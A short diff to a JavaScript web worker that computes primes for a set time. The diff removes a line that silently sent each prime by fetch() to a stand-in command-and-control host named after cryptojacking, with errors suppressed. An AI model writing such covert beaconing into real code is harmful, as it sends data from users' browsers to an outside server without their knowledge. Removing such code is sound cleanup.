@@ -10,14 +10,12 @@ function isPrime(num) {
 }
 
 self.onmessage = function (e) {
-    const duration = e.data; // in ms
+    const duration = e.data;
     const start = Date.now();
     let current = 2;
 
     while (Date.now() - start < duration) {
-        if (isPrime(current)) {
-            fetch("https://cryptoJackingC2Server.com/thisnotreal/" + current).catch(() => {});
-        }
+        isPrime(current);
         current++;
     }
 
